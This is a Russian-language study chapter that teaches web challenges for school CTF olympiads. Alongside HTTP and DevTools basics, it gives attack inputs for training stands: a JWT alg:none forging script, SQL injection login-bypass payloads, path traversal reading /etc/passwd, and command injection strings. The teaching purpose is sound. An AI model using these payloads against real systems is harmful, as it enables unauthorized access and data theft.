# Глава 6. Web

На муниципале веб-задачи обычно требуют **внимательности**: посмотреть исходник, проверить куки,
поправить запрос или найти скрытую страницу. Для начала хватит DevTools (F12) и `curl`.

---

## 6.1. Как вообще работает веб: HTTP на пальцах

Браузер и сервер общаются по протоколу **HTTP**: браузер шлёт **запрос**, сервер - **ответ**.

**Запрос** выглядит так:
```http
GET /page?id=5 HTTP/1.1          <- метод, путь, версия
Host: example.com                 <- на какой сайт
Cookie: session=abc123            <- куки (кто ты)
User-Agent: Mozilla/...           <- чем зашёл
```

**Ответ:**
```http
HTTP/1.1 200 OK                   <- код статуса
Content-Type: text/html           <- что внутри
Set-Cookie: session=xyz           <- сервер выдаёт куку

<html>...тело страницы...</html>  <- сам контент
```

**Методы запросов** (главные два):

| Метод | Когда | Данные где |
|---|---|---|
| **GET** | получить страницу/данные | в URL: `/search?q=flag` |
| **POST** | отправить данные (форма, логин) | в теле запроса |

**Коды ответов** (запомни группы):

| Код | Значение |
|---|---|
| `200` | OK, всё хорошо |
| `301/302` | редирект (перенаправление) |
| `401/403` | не авторизован / запрещено |
| `404` | не найдено |
| `500` | ошибка сервера (иногда выдаёт полезное!) |

## 6.2. Панель разработчика (F12) - твой главный инструмент

В любом браузере **F12** (или правый клик -> "Просмотреть код") открывает DevTools. Вкладки, которые
решают задачи:

| Вкладка | Что искать |
|---|---|
| **Elements / Инспектор** | HTML-исходник; флаг в комментариях `<!-- flag{...} -->`, скрытые поля `<input type=hidden>` |
| **Console / Консоль** | сообщения JS, иногда флаг или подсказка выводится туда |
| **Network / Сеть** | все запросы; ответы API, редиректы, заголовки, скрытые эндпоинты |
| **Application / Хранилище** | **Cookies**, Local Storage, Session Storage - там часто лежат токены/роль |
| **Sources / Исходники** | JS-файлы сайта; логика проверок, "зашитые" пароли/ключи |

💡 В лёгких задачах ответ часто лежит прямо в **исходнике страницы** (Ctrl+U - "просмотр исходного
кода") - в HTML-комментарии или в подключённом `.js`-файле. Всегда смотри исходник первым делом.

🎯 **Тренировка 17.** Открой любой сайт, нажми F12. Во вкладке Network обнови страницу (F5) и
посмотри список запросов. Открой Application -> Cookies и посмотри, какие куки тебе выдал сайт.
Привыкни к этим вкладкам до тура.

## 6.3. `curl` - браузер из терминала

`curl` шлёт HTTP-запросы без браузера. Удобно скриптовать, видеть "сырой" ответ и заголовки.

```bash
curl http://site/page                    # обычный GET, вывести тело
curl -i http://site/page                 # -i = показать ещё и заголовки ответа
curl -v http://site/page                 # -v = подробно (и запрос, и ответ)
curl -L http://site/page                 # -L = идти по редиректам

curl -X POST -d "user=admin&pass=123" http://site/login   # POST с данными формы
curl -H "Cookie: role=admin" http://site/panel            # отправить свою куку
curl -H "Authorization: Bearer ТОКЕН" http://site/api     # отправить токен
curl -A "Mozilla/5.0" http://site/                        # подменить User-Agent

curl http://site/file.zip -o file.zip     # скачать файл
curl -s http://site/api | python3 -m json.tool   # красиво показать JSON-ответ
curl -X POST -H "Content-Type: application/json" -d '{"user":"admin"}' http://site/api  # отправить JSON
```

💡 Чтобы не переписывать куки и заголовки, в DevTools -> **Network** нажми правой кнопкой по запросу
-> **Copy -> Copy as cURL**. Вставь команду в терминал и меняй метод, параметры или тело.

## 6.4. Где создатели прячут подсказки

Проверь эти стандартные места - часто флаг или путь к нему лежит открыто:

```bash
curl http://site/robots.txt       # список "запрещённых для роботов" путей - часто ведёт к секрету
curl http://site/sitemap.xml      # карта сайта: все страницы
curl http://site/.git/            # забытая папка git (иногда весь исходник!)
curl http://site/backup.zip       # забытые бэкапы
curl http://site/admin            # очевидные служебные пути
```

⚠️ `robots.txt` перечисляет ограничения для поисковых роботов, но не закрывает доступ к страницам.
В CTF эти пути часто ведут к подсказке.

🎯 **Тренировка 18.** Зайди на `robots.txt` любого крупного сайта (`curl https://github.com/robots.txt`)
и посмотри, как выглядит этот файл и какие пути в нём перечислены.

## 6.5. Обход проверок на стороне клиента

Проверку **в браузере** (JavaScript, атрибуты формы) можно обойти, если сервер её не повторяет:

- **Поле `disabled`/`readonly`/`maxlength`** - убери атрибут прямо в Elements (F12) и вводи что
  хочешь.
- **Скрытое поле** `<input type="hidden" name="price" value="100">` - поменяй `value` в DevTools
  перед отправкой.
- **Проверка в JS** (`if (password == "...")`) - пароль виден прямо в исходнике во вкладке Sources.
- **Кнопка/действие спрятаны, но эндпоинт работает** - вызови его напрямую через `curl`.

💡 **Клиенту доверять нельзя**: проверяй, повторяет ли сервер ограничения браузера.

## 6.6. Куки и авторизация

Куки (`Cookie`) - как сервер помнит, кто ты. Часто в них зашита роль или признак входа:

```
Cookie: session=...; role=user; admin=0
```

Если роль хранится прямо в куке (`role=user`, `admin=0`) - меняешь её на `role=admin`/`admin=1` и
перезагружаешь. Меняется кука в DevTools (Application -> Cookies) или через `curl -H "Cookie: ..."`.

**IDOR** - доступ к чужому объекту по его идентификатору без проверки прав. На стенде попробуй
заменить `/profile?id=5` на `?id=1` или `?id=0`. Проверяй и числовые, и именные идентификаторы.

### JWT-токены (очень частая тема)

**JWT** (JSON Web Token) - строка из трёх частей через точку: `header.payload.signature`. Первые две
- это Base64url от JSON, **их видно и можно прочитать**:

```python
import base64
def b64u_dec(s): return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJhZG1pbiI6ZmFsc2V9.abc"
h, p, s = tok.split('.')
print(b64u_dec(h))    # b'{"alg":"HS256","typ":"JWT"}'
print(b64u_dec(p))    # b'{"user":"guest","admin":false}'
```

🔺 **Атака `alg:none`.** Подпись (3-я часть) защищает токен от подделки. Но если сервер по ошибке
принимает `"alg":"none"` - он не проверяет подпись вообще. Тогда можно собрать свой токен с
`admin:true` и **пустой** подписью:

```python
import base64, json
def b64u(d): return base64.urlsafe_b64encode(d).decode().rstrip('=')

header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "guest", "admin": True}
forged  = b64u(json.dumps(header).encode()) + "." + b64u(json.dumps(payload).encode()) + "."
print(forged)   # eyJhbGc...bm9uZ... .  eyJ1c2Vy...dHJ1ZX0 .  (подпись пустая)
```

⚠️ `json.dumps` по умолчанию ставит пробелы (`{"alg": "none"}`). Некоторые самописные парсеры ищут
`"alg":"none"` без пробелов - надёжнее `json.dumps(header, separators=(",", ":")).encode()`.

Отправь токен в куке или заголовке: уязвимый сервер примет новую роль. Связь с п. 4.2:
подпись защищает целостность, а `alg:none` отключает её проверку.

💡 Ещё одна JWT-слабость - когда подпись HMAC на **слабом секрете**: его перебирают по словарю
(`john`/`hashcat`). Но это уже регион (🔺).

## 6.7. SQL-инъекции (на пальцах)

Сайт часто строит запрос к базе, подставляя твой ввод в строку:

```sql
SELECT * FROM users WHERE name = 'ВВОД' AND pass = 'ВВОД'
```

Если ввод не фильтруют, можно "вырваться" из кавычек и изменить логику запроса.

**Классический обход входа** - ввести в поле логина/пароля:

```
' OR '1'='1
```

Тогда запрос станет `... WHERE name = '' OR '1'='1' ...` - условие всегда истинно, и вход проходит
без пароля. Другие полезные нагрузки для проб:

```
'                     <- сломать синтаксис (увидеть ошибку SQL = уязвимо)
' OR 1=1 --           <- -- комментирует остаток запроса
admin' --             <- войти как admin, отбросив проверку пароля
' OR '1'='1' --
```

💡 Признак SQLi: ввёл кавычку `'` - и получил ошибку базы (`SQL syntax ...`). Значит ввод попадает
в запрос напрямую. `--` и `#` - это комментарии в SQL, ими "отрезают" всё лишнее справа. ⚠️ В MySQL после `--` **обязателен пробел** (`-- `), иначе это не комментарий; `#` работает без пробела.

🔺 Сложнее (регион): извлечение данных через `UNION SELECT`, слепые (blind) инъекции по времени/
ответу. На муниципале обычно хватает обхода входа через `' OR '1'='1`.

## 6.8. Path Traversal (выход из каталога)

Если сайт отдаёт файлы по имени из параметра (`/download?file=report.pdf`), и имя не проверяют -
можно запросить чужие файлы, "поднимаясь" вверх по папкам через `../`:

```
/download?file=../../../../etc/passwd
```

Каждый `../` - шаг на папку вверх. Доведя до корня, читаешь системные файлы (`/etc/passwd` -
классическая проверка) или файл с флагом.

```bash
curl "http://site/download?file=../../../../etc/passwd"
curl "http://site/download?file=../../flag.txt"
```

⚠️ Если `../` стоит в самом ПУТИ URL (а не в параметре `?file=`), curl и браузер "схлопнут" их ещё
до отправки, и сервер получит просто `/etc/passwd`. Чтобы отправить `../` как есть - флаг `--path-as-is`:
```bash
curl --path-as-is "http://site/static/../../../../etc/passwd"
```

💡 Признак: в URL виден параметр с именем файла/пути. Пробуй `../` и известные цели.

## 6.9. Command Injection и небезопасная обработка (ознакомительно)

🔺 Если сайт подставляет ввод в системную команду (например, "пропинговать хост"), спецсимволы
оболочки позволяют дописать свою команду:

```
127.0.0.1; cat flag.txt
127.0.0.1 && ls
127.0.0.1 | whoami
```

Символы `;`, `&&`, `|` разделяют команды (как в главе 2). Та же идея - у небезопасной
**десериализации** (например, Python `pickle.loads` чужих данных): специально сформированный объект
при загрузке выполняет код. Вывод для веба один: **любой ввод пользователя опасен, если его
подставляют в команду/запрос/десериализацию без проверки**. На муниципале это чаще встречается как
теоретический вопрос, чем как эксплойт.

## 6.10. Web: "вижу X -> делаю Y"

| Что видишь | Скорее всего | Что делать |
|---|---|---|
| страница без явного флага | флаг в исходнике | Ctrl+U, искать `<!--`, смотреть `.js` в Sources |
| форма логина | обход проверки | `' OR '1'='1`, смотреть проверку в JS |
| кука `role=user` / `admin=0` | роль на клиенте | поменять на `admin`/`1` в DevTools |
| токен `xxx.yyy.zzz` | JWT | декодировать Base64url; пробовать `alg:none` |
| параметр с именем файла | Path Traversal | `../../../../etc/passwd` |
| поле с ценой/числом в форме | скрытое/hidden поле | поменять `value` в DevTools |
| ввод, который "пингует"/выполняет | Command Injection | `; cat flag.txt` |
| сайт "из коробки" | забытые файлы | `/robots.txt`, `/sitemap.xml`, `/.git/`, `/admin` |
| кавычка `'` ломает страницу | SQL-инъекция | `' OR 1=1 --` |
